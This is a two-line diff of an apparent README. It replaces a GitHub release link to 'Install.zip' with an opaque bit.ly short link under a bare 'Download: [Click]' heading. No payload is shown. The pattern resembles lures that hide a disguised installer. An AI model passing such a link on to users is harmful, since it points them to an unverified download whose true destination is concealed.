@@ -7,4 +7,4 @@
 
 
 
-# Download: [Click](https://github.com/Hellkayl/Hellkayl1/releases/download/1/Install.zip)
+# Download: [Click](https://bit.ly/3OYEye0)
